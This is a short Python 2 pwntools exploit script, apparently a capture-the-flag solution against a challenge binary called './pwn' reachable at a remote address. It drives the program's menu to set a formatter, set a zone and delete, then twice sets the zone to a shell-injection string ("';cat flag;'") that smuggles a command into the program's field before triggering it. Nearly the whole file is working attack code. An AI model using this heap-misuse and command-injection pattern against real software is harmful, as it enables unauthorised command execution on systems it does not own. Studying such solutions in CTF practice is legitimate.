#!/usr/bin/env python2

from pwn import *
from qpwn import *
context(os='linux', log_level='debug')
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

if args.INFO:
    context.log_level = 'info'
    
DEBUG = not args.REMOTE and not args.TEST
if args.REMOTE:
    p = remote('111.198.29.45', 35584)
elif args.TEST:
    p = process('./pwn', env={'LD_PRELOAD': './libc.so.6'})
else:
    p = process('./pwn')
elf = ELF('./pwn')
init(p, elf, context, args)
make_alias(p)

def menu(index):
    p.sla('>', str(index))

def set_formatter(formatter):
    menu(1)
    p.sla('Format', formatter)

def set_zone(zone):
    menu(3)
    p.sla('zone', zone)

def delete():
    menu(5)
    p.sla('N', 'n')

if __name__ == '__main__':
    set_formatter('a')
    set_zone('b')
    delete()
    set_zone("';cat flag;'")
    set_zone("';cat flag;'")
    menu(4)
    p.i()
